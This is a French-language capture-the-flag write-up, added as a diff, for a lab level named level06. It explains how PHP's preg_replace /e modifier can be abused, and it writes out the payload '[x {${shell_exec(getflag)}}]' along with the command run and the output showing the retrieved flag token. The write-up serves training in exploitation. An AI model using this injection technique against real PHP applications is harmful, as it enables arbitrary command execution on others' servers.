@@ -1,0 +1,36 @@
+#On arrive sur le home et on a deux fichier, un code source php et un binaire qui a l'air correspondre au code compile du .php
+
+#Apres quelque test on s'apercoit que le programme sert a afficher le contenu d'un fichier donc notre exploit vas passer par un
+#fichier avec des commandes en contenu
+
+#Apres quelque recherche afin de trouver un endroit ou le code passer en contenu pourras etre executer, je suis tomber sur un faille connu
+# de la fonction preg_replace et de son "option" \e.
+
+#Cette option permet d'application une fonction sur un portion de la chaine passer en parametre, donc notre chaine sera evalue
+# en temps que string php
+
+#En php il est possible d'avoir le retour d'une fonction en utilisant des brackets, donc notre fichier va contenir une string de cette forme:
+
+{${shell_exec(getflag)}}
+
+#shell_exec() etant une fonction php permettant d'executer une commande shell.
+
+#Maintenant il faut que cette portion de string soit execute par le code, donc il faut que l'ensemble match la regex passee en premier
+# argument
+
+reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+
+regex : (\[x (.*)\])
+
+#Il faut donc que la chaine commence par "[x " et finisse par "]"
+
+[x {${shell_exec(getflag)}}]
+
+#Et voila, il nous reste plus qu'a executer le binaire avec notre nouveau fichier 
+
+./level06 /tmp/azur/test
+
+>>> 
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
